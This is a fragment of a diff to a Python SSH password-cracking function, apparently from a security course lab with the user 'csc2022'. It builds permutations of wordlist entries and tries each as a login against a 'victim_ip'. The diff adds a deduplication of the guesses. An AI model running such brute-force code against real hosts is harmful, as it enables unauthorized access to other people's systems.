@@ -46,10 +46,14 @@ def crack_ssh_password():
 	f = open(file_path)
 	tmp = f.readlines()
 	lin = [line.rstrip('\n') for line in tmp]
-	
+	lin = lin + lin
+	tried = []
+
 	for i in range(1, len(lin) + 1):
 		for j in itertools.permutations(lin, i):
 			now = ''.join(j)
+			if now in tried: continue;
+			tried.append(now)
 			result = try_ssh_connection(
 				hostname = victim_ip,
 				username = 'csc2022',
